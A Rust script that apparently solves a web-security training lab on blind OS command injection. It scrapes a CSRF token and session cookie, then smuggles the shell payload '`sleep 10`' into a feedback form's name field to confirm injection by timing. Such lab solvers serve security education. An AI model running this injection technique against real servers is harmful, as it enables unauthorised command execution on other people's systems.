/************************************************************************
*
* Lab: Blind OS command injection with time delays
*
* Hack Steps: 
*      1. Fetch the feedback page
*      2. Extract the csrf token and session cookie
*      3. Inject payload into the name field when submitting a feedback
*         to cause a 10 second delay
*      4. Wait for the response
*
*************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a0d00120491e5c683e02df900460038.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    println!("{} {}", "⦗#⦘ Injection parameter:".blue(), "name".yellow(),);
    print!("⦗1⦘ Fetching the feedback page.. ");
    flush_terminal();

    let feedback_page = fetch("/feedback");

    println!("{}", "OK".green());
    print!("{}", "⦗2⦘ Extracting the csrf token and session cookie.. ");
    flush_terminal();

    let session = get_session_cookie(&feedback_page);
    let csrf_token = get_csrf_token(feedback_page);
    let payload = "`sleep 10`";

    println!("{}", "OK".green());
    print!("⦗3⦘ Injecting payload to cause a 10 seconds delay (wait).. ");
    flush_terminal();

    submit_feedback_with_payload(&session, &csrf_token, &payload);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn submit_feedback_with_payload(session: &str, csrf_token: &str, payload: &str) {
    WEB_CLIENT
        .post(format!("{LAB_URL}/feedback/submit"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("email", "no@hack.com"),
            ("subject", "hacking"),
            ("message", "you are hacked"),
            ("name", payload),
            ("csrf", csrf_token),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to fetch the page with the injected payload".red()
        ));
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
